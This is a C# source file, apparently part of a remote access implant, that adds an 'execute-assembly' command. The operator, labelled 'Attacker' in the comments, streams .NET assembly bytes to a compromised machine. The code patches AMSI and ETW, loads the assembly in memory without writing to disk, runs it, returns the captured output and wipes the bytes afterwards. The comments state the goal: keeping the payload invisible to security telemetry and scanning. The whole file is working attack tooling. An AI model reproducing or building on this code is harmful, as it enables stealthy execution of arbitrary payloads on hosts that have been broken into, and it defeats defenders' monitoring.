using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

namespace SvcUtil
{
    /// <summary>
    /// In-process .NET assembly loader — the "execute-assembly" primitive.
    /// Loads a .NET assembly from raw bytes (never touches disk), invokes its
    /// EntryPoint with the supplied arguments, and streams captured
    /// Console output back through the shell stream.
    ///
    /// Because loading happens inside the same process that already has
    /// ETW + AMSI patched (via ScanPatch.PatchCurrentProcess), the loaded
    /// assembly is invisible to both telemetry and content scanning.
    ///
    /// Protocol:
    ///   Attacker  →  !execute-assembly &lt;size&gt; [arg0 arg1 ...]
    ///   Target    →  READY\n
    ///   Attacker  →  &lt;size&gt; raw bytes of the .NET assembly
    ///   Target    →  captured stdout/stderr, then DONE or ERR line
    /// </summary>
    internal static class AssemblyRunner
    {
        private const string ExecAsmCmd = "!execute-assembly ";

        /// <summary>
        /// Check if a line is an execute-assembly command. Returns true if handled.
        /// </summary>
        public static bool TryHandle(string line, IShellStream stream)
        {
            line = line.Trim();

            if (!line.StartsWith(ExecAsmCmd, StringComparison.OrdinalIgnoreCase))
                return false;

            string rest = line.Substring(ExecAsmCmd.Length).Trim();
            return HandleExecuteAssembly(rest, stream);
        }

        private static bool HandleExecuteAssembly(string args, IShellStream stream)
        {
            // Parse: <size> [arg0 arg1 ...]
            if (string.IsNullOrEmpty(args))
            {
                SendLine(stream, "ERR: usage: !execute-assembly <size> [args...]");
                return true;
            }

            string[] parts = args.Split(new char[] { ' ' }, 2);
            long size;
            if (!long.TryParse(parts[0], out size) || size <= 0)
            {
                SendLine(stream, "ERR: invalid assembly size");
                return true;
            }

            // Parse optional arguments for the assembly's Main(string[] args)
            string[] assemblyArgs = new string[0];
            if (parts.Length > 1 && !string.IsNullOrEmpty(parts[1]))
            {
                assemblyArgs = ParseArgs(parts[1].Trim());
            }

            // Signal the listener we're ready to receive
            SendLine(stream, "READY");

            // Receive assembly bytes
            byte[] assemblyBytes;
            try
            {
                assemblyBytes = ReceiveBytes(stream, size);
                if (assemblyBytes == null)
                {
                    SendLine(stream, "ERR: connection lost during assembly transfer");
                    return true;
                }
            }
            catch (Exception ex)
            {
                SendLine(stream, "ERR: transfer failed: " + ex.Message);
                return true;
            }

            // Ensure AMSI + ETW are patched before loading
            ScanPatch.PatchCurrentProcess();

            // Load and execute in a dedicated thread so we can capture output
            // and avoid blocking the shell writer loop forever
            Exception runError = null;
            string capturedOutput = null;

            var runner = new Thread(() =>
            {
                // Redirect Console.Out and Console.Error to capture output
                var origOut = Console.Out;
                var origErr = Console.Error;
                var capture = new StringWriter();

                try
                {
                    Console.SetOut(capture);
                    Console.SetError(capture);

                    Assembly asm = Assembly.Load(assemblyBytes);
                    MethodInfo entryPoint = asm.EntryPoint;

                    if (entryPoint == null)
                    {
                        runError = new InvalidOperationException(
                            "Assembly has no EntryPoint (not an EXE?)");
                        return;
                    }

                    // Determine how to invoke: Main() or Main(string[])
                    ParameterInfo[] paramInfos = entryPoint.GetParameters();
                    object[] invokeArgs;

                    if (paramInfos.Length == 0)
                        invokeArgs = null;
                    else
                        invokeArgs = new object[] { assemblyArgs };

                    entryPoint.Invoke(null, invokeArgs);
                }
                catch (TargetInvocationException tie)
                {
                    // Unwrap to get the real exception from the loaded assembly
                    runError = tie.InnerException ?? tie;
                }
                catch (Exception ex)
                {
                    runError = ex;
                }
                finally
                {
                    Console.SetOut(origOut);
                    Console.SetError(origErr);
                    capturedOutput = capture.ToString();
                }
            });

            runner.IsBackground = true;
            runner.Start();
            runner.Join(300000); // 5 minute timeout

            // Wipe assembly bytes from memory
            Array.Clear(assemblyBytes, 0, assemblyBytes.Length);

            // Send captured output
            if (!string.IsNullOrEmpty(capturedOutput))
            {
                byte[] outBytes = Encoding.UTF8.GetBytes(capturedOutput);
                stream.Send(outBytes, 0, outBytes.Length);
            }

            if (runError != null)
            {
                SendLine(stream, "ERR: " + runError.GetType().Name + ": " + runError.Message);
            }
            else if (!runner.IsAlive)
            {
                SendLine(stream, "DONE: assembly executed successfully");
            }
            else
            {
                // Thread still running after timeout
                SendLine(stream, "ERR: assembly execution timed out (5 min)");
            }

            return true;
        }

        /// <summary>
        /// Receive exactly 'size' bytes from the stream.
        /// </summary>
        private static byte[] ReceiveBytes(IShellStream stream, long size)
        {
            if (size > 100 * 1024 * 1024) // 100 MB sanity limit
                return null;

            byte[] buffer = new byte[size];
            long received = 0;
            byte[] chunk = new byte[Config.BufferSize];

            while (received < size)
            {
                int toRead = (int)Math.Min(size - received, chunk.Length);
                int got = stream.Receive(chunk, 0, toRead);
                if (got <= 0) return null;

                Buffer.BlockCopy(chunk, 0, buffer, (int)received, got);
                received += got;
            }

            return buffer;
        }

        /// <summary>
        /// Parse arguments respecting quoted strings.
        /// Supports: arg1 "arg with spaces" arg3
        /// </summary>
        private static string[] ParseArgs(string input)
        {
            var args = new System.Collections.Generic.List<string>();
            var current = new StringBuilder();
            bool inQuote = false;

            for (int i = 0; i < input.Length; i++)
            {
                char c = input[i];

                if (c == '"')
                {
                    inQuote = !inQuote;
                    continue;
                }

                if (c == ' ' && !inQuote)
                {
                    if (current.Length > 0)
                    {
                        args.Add(current.ToString());
                        current.Clear();
                    }
                    continue;
                }

                current.Append(c);
            }

            if (current.Length > 0)
                args.Add(current.ToString());

            return args.ToArray();
        }

        private static void SendLine(IShellStream stream, string msg)
        {
            byte[] data = Encoding.UTF8.GetBytes(msg + "\n");
            stream.Send(data, 0, data.Length);
        }
    }
}
